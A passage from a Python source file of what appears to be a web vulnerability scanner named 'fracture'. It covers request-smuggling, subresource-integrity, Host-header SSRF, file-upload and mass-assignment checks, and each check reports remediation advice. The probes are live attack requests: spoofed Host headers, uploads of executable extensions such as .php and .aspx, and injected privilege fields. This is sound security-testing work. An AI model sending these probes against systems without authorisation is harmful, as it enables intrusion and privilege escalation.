                except (_sock.error, _ssl2.SSLError, BrokenPipeError, OSError):
                    pass
                if resp2:
                    code2 = _status(resp2)
                    if (code2 in (400, 405)
                            and _baseline_code
                            and _baseline_code not in (400, 405)):
                        _te_obfusc_found = True
                        ev = _save_smuggle_evidence(
                            "te_obfusc",
                            f"=== TE Obfuscation Smuggling Evidence ===\n"
                            f"Obfuscated header: {_te_hdr!r}\n\n"
                            f"--- Request ---\n"
                            f"{probe.decode(errors='replace')}\n\n"
                            f"--- Response 1 ---\n"
                            f"{resp1.decode(errors='replace')[:800]}\n\n"
                            f"--- Follow-up (HTTP {code2}) ---\n"
                            f"{resp2.decode(errors='replace')[:800]}\n")
                        out.add_finding(
                            title="HTTP Request Smuggling — TE Obfuscation Desync",
                            url=url, port=port, risk="CRITICAL",
                            description=(
                                f"A request smuggling vulnerability was confirmed via "
                                f"Transfer-Encoding header obfuscation. The header "
                                f"variant {_te_hdr!r} was processed differently by the "
                                f"front-end and back-end, creating a desync.\n\n"
                                f"Follow-up GET {base_path} → HTTP {code2} "
                                f"(expected {_baseline_code})."),
                            output=(
                                f"TE header: {_te_hdr!r}\n"
                                f"Follow-up: GET {base_path} → HTTP {code2} "
                                f"(expected {_baseline_code})"),
                            output_file=ev,
                            sources="fracture-smuggling", service=scheme,
                            affected=base_path, cves="",
                            owasp="A08:2025 Software and Data Integrity Failures",
                            nist="SI-10",
                            remediation=(
                                "Normalise Transfer-Encoding headers at the front-end "
                                "proxy. Reject requests with ambiguous or obfuscated "
                                "TE headers. Enable HTTP/2 end-to-end."),
                        )
                        vc.log(f"[request_smuggling] TE obfuscation CONFIRMED: "
                               f"{_te_hdr!r}", "SUCCESS")
            _close(sock)
            sock = None
        except Exception:
            pass
        finally:
            if sock:
                _close(sock)

    if not _te_obfusc_found:
        vc.log("[request_smuggling] No TE obfuscation desync detected", "INFO")

    vc.status(phase, "Request Smuggling", "complete", "Done", 4, 4)
    vc.log("[request_smuggling] Phase complete", "SUCCESS")


# =============================================================================
# A08 Subresource Integrity check (2026-06-11 review)
# =============================================================================
# Parses HTML pages discovered during crawl + flags <script>/<link> tags
# pointing at external origins WITHOUT a valid `integrity=` attribute.
# SRI is the only way to prevent supply-chain tampering of CDN-served JS.

_SRI_ORIGIN_RE = re.compile(r'(?:src|href)=["\']https?://([^/"\']+)/[^"\']*["\']',
                              re.IGNORECASE)

def _phase_sri_check(target: dict, cfg: dict, pm: ProgressManager,
                     out: OutputManager, sess: requests.Session,
                     crawl_data: dict) -> None:
    """A08: detect external <script>/<link> elements served without SRI."""
    phase = "sri_check"
    url   = target["url"]
    timeout = cfg.get("timeout", 10)
    vc.status(phase, "SRI", "running", "checking SRI on external resources", 0, 1)
    # First fetch the landing page; then sample up to 5 crawl URLs
    pages_to_check = [url]
    for ep in (crawl_data.get("endpoints") or [])[:5]:
        if ep.get("url") and ep["url"] not in pages_to_check:
            pages_to_check.append(ep["url"])
    own_host = (urllib.parse.urlparse(url).hostname or "").lower()
    flagged: list[dict] = []
    for page_url in pages_to_check:
        try:
            r = sess.get(page_url, timeout=timeout, verify=False, allow_redirects=True)
            if r.status_code != 200: continue
            body = r.text
        except Exception:
            continue
        # Look at <script src=...> and <link href=...> tags
        for tag_m in re.finditer(
                r'<\s*(script|link)\b([^>]*)>', body, re.IGNORECASE):
            tag_name = tag_m.group(1).lower()
            attrs    = tag_m.group(2)
            src_m = re.search(r'(?:src|href)=["\']([^"\']+)["\']', attrs, re.IGNORECASE)
            if not src_m: continue
            res_url = src_m.group(1)
            res_host = (urllib.parse.urlparse(res_url).hostname or "").lower()
            if not res_host or res_host == own_host:
                continue   # same-origin — SRI not required (still best practice)
            # rel="stylesheet" or rel="modulepreload"/script types matter for link
            if tag_name == "link":
                rel_m = re.search(r'rel=["\']([^"\']+)["\']', attrs, re.IGNORECASE)
                if rel_m and rel_m.group(1).lower() not in (
                        "stylesheet", "modulepreload", "preload"):
                    continue
            # Check for an integrity attribute
            if re.search(r'integrity=["\'][^"\']*["\']', attrs, re.IGNORECASE):
                continue
            flagged.append({"page": page_url, "tag": tag_name, "url": res_url,
                             "host": res_host})
    if flagged:
        # Emit one finding per unique (host, tag) pair to keep noise down
        seen_pairs = set()
        for entry in flagged:
            key = (entry["host"], entry["tag"])
            if key in seen_pairs: continue
            seen_pairs.add(key)
            _sri_ev = ""
            try:
                _sri_r = sess.get(entry["page"], timeout=timeout, verify=False, allow_redirects=True)
                _sri_safe = re.sub(r'[^a-zA-Z0-9_-]', '_', entry["host"])[:30]
                _sri_rq, _sri_rp = _save_http_evidence(
                    out, phase, f"sri_{_sri_safe}_{entry['tag']}", _sri_r)
                _sri_ev = json.dumps(
                    [{"url": entry["page"], "req": str(_sri_rq), "resp": str(_sri_rp)}])
            except Exception:
                pass
            out.add_finding(
                title=f"Missing Subresource Integrity — {entry['tag']} from {entry['host']}",
                url=entry["page"], port=target["port"], risk="MEDIUM",
                description=(
                    f"The page {entry['page']} loads a <{entry['tag']}> from "
                    f"the external origin {entry['host']} without an `integrity=` "
                    f"attribute. If the third party is compromised (or the CDN "
                    f"is MITMed), the attacker controls JavaScript executed in "
                    f"the application's origin. Resource: {entry['url']}"),
                output=f"Page: {entry['page']}\nTag:  <{entry['tag']}>\nURL:  {entry['url']}",
                sources="fracture-sri",
                output_file=_sri_ev,
                service=target["scheme"], affected=entry["url"],
                owasp="A08:2025 Software and Data Integrity Failures",
                nist="SI-7",
                remediation=(
                    "Add an integrity=\"sha384-...\" attribute to every external "
                    "<script>/<link> tag. Either pin the resource version + "
                    "compute its hash, or self-host the asset to eliminate the "
                    "supply-chain dependency."),
            )
    vc.status(phase, "SRI", "complete", f"checked {len(pages_to_check)} pages, "
              f"{len(flagged)} unprotected externals", 1, 1)
    vc.log(f"[sri] Phase complete — {len(flagged)} SRI-less external resources", "SUCCESS")


# =============================================================================
# A10 Host-header SSRF (2026-06-11 review)
# =============================================================================
# Replaces the Host header on a baseline GET with attacker-controlled values
# (collaborator + localhost variants) and looks for response-body / status
# differences that indicate the back-end honored the spoofed host.

def _phase_host_header_ssrf(target: dict, cfg: dict, pm: ProgressManager,
                             out: OutputManager, sess: requests.Session,
                             crawl_data: dict) -> None:
    phase = "host_header_ssrf"
    url   = target["url"]
    timeout = cfg.get("timeout", 10)
    vc.status(phase, "Host-Header SSRF", "running", "baseline", 0, 1)
    # Get a baseline body
    try:
        baseline = sess.get(url, timeout=timeout, verify=False, allow_redirects=False)
    except Exception:
        return
    if baseline is None:
        return
    base_status = baseline.status_code
    base_len    = len(baseline.text)
    # Three host-rewrite probes:
    spoofs = [
        ("Host=127.0.0.1",       {"Host": "127.0.0.1"}),
        ("Host=internal-only.local", {"Host": "internal-only.local"}),
        ("X-Forwarded-Host",     {"X-Forwarded-Host": "attacker.fracture-internal"}),
    ]
    for label, hdrs in spoofs:
        try:
            r = sess.get(url, timeout=timeout, verify=False,
                          allow_redirects=False, headers=hdrs)
        except Exception:
            continue
        # Marker: 3xx redirect to a host derived from the spoofed Host header,
        # OR response body contains "internal-only.local" / "attacker.fracture-internal"
        loc = r.headers.get("Location", "") or r.headers.get("location", "")
        body = r.text
        spoofed_value = (list(hdrs.values())[0]).lower()
        triggered = False
        if 300 <= r.status_code < 400 and spoofed_value in loc.lower():
            triggered = True; evidence = f"Location header reflects spoofed host: {loc}"
        elif spoofed_value in body.lower():
            triggered = True; evidence = f"Response body contains spoofed host: {spoofed_value}"
        elif abs(len(body) - base_len) > 200 and r.status_code != base_status:
            triggered = True; evidence = (f"Response differs significantly from baseline "
                                            f"(status {base_status} → {r.status_code}, "
                                            f"len {base_len} → {len(body)})")
        if triggered:
            _hssrf_ev = ""
            try:
                _hssrf_rq, _hssrf_rp = _save_http_evidence(
                    out, phase, f"host_ssrf_{label}", r)
                _hssrf_ev = json.dumps(
                    [{"url": url, "req": str(_hssrf_rq), "resp": str(_hssrf_rp)}])
            except Exception:
                pass
            out.add_finding(
                title=f"Host-Header SSRF Surface ({label})",
                url=url, port=target["port"], risk="MEDIUM",
                description=(
                    f"The server at {url} honored a spoofed {label}. {evidence}. "
                    f"Attackers can use Host-header injection to reach internal "
                    f"services through the application's proxy, poison password-"
                    f"reset emails, or trigger SSRF against internal-only endpoints."),
                output=f"Baseline: {base_status}, len={base_len}\n"
                       f"Spoof: {label}\nResponse: {r.status_code}, len={len(body)}\n"
                       f"Evidence: {evidence}",
                sources="fracture-host-ssrf",
                output_file=_hssrf_ev,
                service=target["scheme"], affected=url,
                owasp="A10:2025 Server-Side Request Forgery",
                nist="SC-7",
                remediation=(
                    "Validate the Host header against an allow-list at the "
                    "reverse-proxy layer (or in the application). Reject requests "
                    "with X-Forwarded-Host / X-Forwarded-Server / X-Original-URL "
                    "from untrusted upstreams."),
            )
            break   # first spoof succeeded — no need to test others
    vc.status(phase, "Host-Header SSRF", "complete", "done", 1, 1)
    vc.log(f"[host-ssrf] Phase complete", "SUCCESS")


# =============================================================================
# Phase 18: File Upload — Informational
# =============================================================================

def _phase_file_upload_info(target: dict, cfg: dict, pm: ProgressManager,
                            out: OutputManager, sess: requests.Session,
                            crawl_data: dict) -> None:
    """Phase 18: Detect file upload endpoints and report accepted file types (informational)."""
    phase   = "file_upload_info"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    forms   = crawl_data.get("forms", [])
    vc.status(phase, "File Upload Info", "running", "Detecting upload forms", 0, 1)

    upload_forms = [
        f for f in forms
        if any(i.get("type") == "file" for i in f.get("inputs", []))
        or "multipart" in f.get("enctype", "")
    ]

    # ── Screenshot each file upload page (authenticated) ─────────────
    _upl_ss_dir = out.root / "recon"
    _upl_ss_dir.mkdir(parents=True, exist_ok=True)
    _upl_ss_done: set = set()
    _upl_ss_max  = 5
    for _upl_form in upload_forms:
        _upl_page_url = _upl_form.get("page_url") or _upl_form.get("action", url)
        _upl_page_norm = _upl_page_url.rstrip("/")
        if _upl_page_norm in _upl_ss_done or len(_upl_ss_done) >= _upl_ss_max:
            continue
        _upl_ss_done.add(_upl_page_norm)
        _upl_safe = re.sub(r'[^a-zA-Z0-9_-]', '_',
                           _upl_page_url.replace("://", "_"))[:50]
        _upl_ss_path = _upl_ss_dir / f"screenshot_upload_{_upl_safe}.png"
        try:
            if _capture_screenshot_to(_upl_page_url, _upl_ss_path, target, cfg,
                                      auth_session=sess):
                _upl_rel = urllib.parse.urlparse(_upl_page_url).path or "/"
                out.add_finding(
                    title="Discovery: Web Screenshot Captured",
                    url=_upl_page_url, port=target["port"], risk="INFO",
                    description=(
                        f"Screenshot of file upload page: {_upl_page_url}"
                    ),
                    affected=_upl_rel,
                    output=f"Saved: {_upl_ss_path.name}",
                    sources="fracture-screenshot", service=target["scheme"],
                    output_file=str(_upl_ss_path),
                    owasp="A04:2025 Insecure Design", nist="SI-3",
                    remediation="Review screenshot for exposed sensitive content.",
                )
                vc.log(
                    f"[file_upload_info] Screenshot: {_upl_ss_path.name}",
                    "SUCCESS",
                )
        except Exception:
            pass

    # Rejection / confirmation body markers for upload responses
    _UPL_REJECT_RE = re.compile(
        r'not.allowed|invalid.file|rejected|unsupported|'
        r'extension.not|file.type|blocked|not.permitted|'
        r'validation.failed|dangerous|disallowed', re.I)
    _UPL_CONFIRM_RE = re.compile(
        r'uploaded.successfully|file.saved|upload.complete|'
        r'file.accepted|successfully.uploaded', re.I)

    for form in upload_forms:
        action   = form.get("action", url)
        inputs   = form.get("inputs", [])
        file_inp = next((i for i in inputs if i.get("type") == "file"), None)
        if not file_inp:
            continue

        accept_attr = file_inp.get("accept", "")
        pname       = file_inp.get("name", "file")

        # Fetch the form page fresh to get current hidden field values
        # (ASP.NET WebForms requires valid __VIEWSTATE / __EVENTVALIDATION).
        _fresh_hidden: dict = {}
        _baseline_body = ""
        try:
            _page_r = sess.get(action, timeout=timeout)
            if _page_r and _page_r.status_code == 200:
                _baseline_body = (_page_r.text or "")[:16000]
                for _hm in re.finditer(
                        r'<input[^>]+type=["\']?hidden["\']?[^>]*>', _page_r.text, re.I):
                    _htag = _hm.group(0)
                    _hn = re.search(r'name=["\']([^"\']+)["\']', _htag, re.I)
                    _hv = re.search(r'value=["\']([^"\']*)["\']', _htag, re.I)
                    if _hn:
                        _fresh_hidden[_hn.group(1)] = _hv.group(1) if _hv else ""
        except Exception:
            pass

        probe_extensions = [".txt", ".html", ".php", ".jsp", ".aspx", ".svg"]
        accepted_types   = []
        dangerous_found  = []
        _ev_files: list  = []

        for ext in probe_extensions:
            fname    = f"fracture_probe{ext}"
            content  = b"fracture_upload_test"
            files    = {pname: (fname, content, "text/plain")}
            # Use fresh hidden fields (ViewState etc.) then fill remaining
            extra    = dict(_fresh_hidden)
            for i in inputs:
                _iname = i.get("name", "")
                if _iname and i.get("type") != "file" and _iname not in extra:
                    extra[_iname] = i.get("value", "") or "test"
            try:
                r = sess.post(action, files=files, data=extra, timeout=timeout)
                if not r:
                    continue
                if _inj_is_login_page(r):
                    continue
                if r.status_code not in (200, 201, 302):
                    continue
                _body = (r.text or "")[:16000]
                _body_lower = _body.lower()
                fname_lower = fname.lower()

                # Check for explicit rejection
                if _UPL_REJECT_RE.search(_body):
                    continue
                # Check for positive confirmation signals
                _confirmed = (
                    fname_lower in _body_lower
                    or _UPL_CONFIRM_RE.search(_body)
                )
                # If no confirmation AND response is identical to baseline
                # (same page re-rendered without processing), skip.
                if not _confirmed and _baseline_body:
                    # Compare body length — within 5% = same page
                    _ratio = abs(len(_body) - len(_baseline_body)) / max(len(_baseline_body), 1)
                    if _ratio < 0.05:
                        continue

                accepted_types.append(ext)
                if _UPLOAD_ACCEPT_DANGEROUS.search(ext):
                    dangerous_found.append(ext)
                try:
                    _rq, _rp = _save_http_evidence(
                        out, "file_upload_info", f"upload_{ext.lstrip('.')}",
                        r, endpoint_url=action, method="POST")
                    _ev_files.extend([_rq, _rp])
                except Exception:
                    pass
            except Exception:
                pass

        if not accepted_types:
            vc.log(f"[file_upload_info] Upload form at {action} — no extensions confirmed accepted", "INFO")
            continue

        risk        = "HIGH" if dangerous_found else "INFO"
        description = (
            f"File upload endpoint found at {action} (field: '{pname}'). "
            + (f"Accepted file types from probe: {', '.join(accepted_types)}. " if accepted_types else "")
            + (f"DANGEROUS: server accepted potentially executable extensions: "
               f"{', '.join(dangerous_found)}. " if dangerous_found else "")
            + (f"'accept' attribute declares: {accept_attr}. " if accept_attr else "")
        )
        remediation = (
            "Validate file extensions and MIME types server-side. "
            "Store uploads outside the web root. "
            "Rename uploaded files to random UUIDs. "
            "Scan uploaded content with antivirus. "
            "Restrict execution permissions on the upload directory."
        ) if dangerous_found else (
            "Confirm server-side extension validation is enforced. "
            "Ensure uploaded files are stored outside the web root with non-executable permissions."
        )

        out.add_finding(
            title="File Upload Endpoint Detected" if not dangerous_found
                  else "Unrestricted File Upload — Dangerous Extension Accepted",
            url=action, port=target["port"], risk=risk,
            description=description,
            output=(f"Form action: {action}\nFile field: {pname}\n"
                    f"Accept attribute: {accept_attr or '(none)'}\n"
                    f"Probed extensions: {', '.join(probe_extensions)}\n"
                    f"Accepted: {', '.join(accepted_types) or '(none confirmed)'}"),
            output_file=",".join(_ev_files) if _ev_files else "",
            sources="fracture-file-upload", service=target["scheme"],
            affected=action, owasp="A04:2025 Insecure Design", nist="SI-3",
            remediation=remediation,
        )
        vc.log(f"[file_upload_info] Upload form at {action} — accepted: {accepted_types}", "SUCCESS")

    if not upload_forms:
        vc.log("[file_upload_info] No file upload forms detected", "INFO")

    vc.status(phase, "File Upload Info", "complete", "Done", 1, 1)
    vc.log("[file_upload_info] Phase complete", "SUCCESS")


# =============================================================================
# Phase 19: Mass Assignment
# =============================================================================

def _phase_mass_assignment(target: dict, cfg: dict, pm: ProgressManager,
                           out: OutputManager, sess: requests.Session,
                           crawl_data: dict) -> None:
    """Phase 19: Test web forms and JSON endpoints for mass assignment vulnerabilities."""
    phase   = "mass_assignment"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    forms   = crawl_data.get("forms", [])
    vc.status(phase, "Mass Assignment", "running", "Testing forms", 0, 2)

    _ma_found: set = set()

    # 1. Form-based mass assignment
    for form in forms[:15]:
        action  = form.get("action", url)
        method  = form.get("method", "POST")
        inputs  = form.get("inputs", [])
        if method.upper() not in ("POST", "PUT", "PATCH"):
            continue
        if action in _ma_found:
            continue

        # Baseline submission
        base_data = {i["name"]: "test_value" for i in inputs if i.get("name")}
        try:
            r_base = sess.post(action, data=base_data, timeout=timeout)
        except Exception:
            continue

        # Augmented submission with privileged fields
        aug_data = dict(base_data)
        for ma_field in _MASS_ASSIGN_FIELDS:
            aug_data[ma_field] = "1"
        try:
            r_aug = sess.post(action, data=aug_data, timeout=timeout)
            # Heuristic: field name must appear in the augmented response but NOT
            # in the baseline response — eliminates FPs from ARIA role attributes,
            # common English words (admin, role, verified) in page content, etc.
            if r_aug and any(f in r_aug.text and f not in r_base.text
                             for f in _MASS_ASSIGN_FIELDS):
                reflected = [f for f in _MASS_ASSIGN_FIELDS
                             if f in r_aug.text and f not in r_base.text]
                _ma_found.add(action)
                _ma_ev = ""
                try:
                    _ma_safe = re.sub(r'[^a-zA-Z0-9_-]', '_', action)[:50]
                    _ma_rq, _ma_rp = _save_http_evidence(
                        out, phase, f"mass_assign_form_{_ma_safe}", r_aug)
                    _ma_ev = json.dumps(
                        [{"url": action, "req": str(_ma_rq), "resp": str(_ma_rp)}])
                except Exception:
                    pass
                out.add_finding(
                    title="Mass Assignment / Privilege Escalation via Parameter Binding",
                    url=action, port=target["port"], risk="HIGH",
                    description="The application or API auto-binds request input properties to internal model objects without restricting which fields may be set, allowing an attacker to inject privileged fields (e.g., role, isAdmin) and escalate privileges.",
                    output=(f"Form: {action}\nInjected fields: {', '.join(reflected)}\n"
                            f"Response snippet: {r_aug.text[:400]}"),
                    sources="fracture-mass-assignment", service=target["scheme"],
                    output_file=_ma_ev,
                    affected=action, owasp="A01:2025 Broken Access Control", nist="AC-3",
                    remediation="Define and enforce an explicit allowlist of bindable properties using DTOs or input validation schemas; reject or ignore any request field not explicitly permitted for the given operation.",
                )
                vc.log(f"[mass_assignment] Form mass assignment at {action}: {reflected}", "SUCCESS")
        except Exception:
            pass

    vc.status(phase, "Mass Assignment", "running", "Testing JSON endpoints", 1, 2)
    # 2. JSON body mass assignment on common profile/update endpoints
    _json_update_paths = ["/api/user", "/api/profile", "/profile", "/user",
                          "/api/v1/user", "/api/v1/profile", "/account", "/api/account",
                          "/user/update", "/api/user/update"]
    for jpath in _json_update_paths:
        jurl = url.rstrip("/") + jpath
        if jurl in _ma_found:
            continue
        try:
            base_resp = sess.put(jurl, json={"name": "fracture_test"}, timeout=timeout)
            if base_resp and base_resp.status_code in (200, 201, 204):
                priv_payload = {"name": "fracture_test"}
                for f in _MASS_ASSIGN_FIELDS:
                    priv_payload[f] = True
                r_priv = sess.put(jurl, json=priv_payload, timeout=timeout)
                if r_priv and any(f in r_priv.text and f not in base_resp.text
                                  for f in _MASS_ASSIGN_FIELDS):
                    reflected_j = [f for f in _MASS_ASSIGN_FIELDS
                                   if f in r_priv.text and f not in base_resp.text]
                    _ma_found.add(jurl)
                    _maj_ev = ""
                    try:
                        _maj_rq, _maj_rp = _save_http_evidence(
                            out, phase, f"mass_assign_json_{jpath.strip('/')}", r_priv)
                        _maj_ev = json.dumps(
                            [{"url": jurl, "req": str(_maj_rq), "resp": str(_maj_rp)}])
                    except Exception:
                        pass
                    out.add_finding(
                        title="Mass Assignment / Privilege Escalation via Parameter Binding",
                        url=jurl, port=target["port"], risk="HIGH",
                        description="The application or API auto-binds request input properties to internal model objects without restricting which fields may be set, allowing an attacker to inject privileged fields (e.g., role, isAdmin) and escalate privileges.",
                        output=(f"PUT {jpath}\nInjected: {list(priv_payload.keys())}\n"
                                f"Reflected: {reflected_j}\nResponse: {r_priv.text[:400]}"),
                        sources="fracture-mass-assignment", service=target["scheme"],
                        output_file=_maj_ev,
                        affected=jurl, owasp="A01:2025 Broken Access Control", nist="AC-3",
                        remediation="Define and enforce an explicit allowlist of bindable properties using DTOs or input validation schemas; reject or ignore any request field not explicitly permitted for the given operation.",
                    )
                    vc.log(f"[mass_assignment] JSON mass assignment at {jpath}: {reflected_j}", "SUCCESS")
        except Exception:
            pass

    vc.status(phase, "Mass Assignment", "complete", "Done", 2, 2)
    vc.log("[mass_assignment] Phase complete", "SUCCESS")


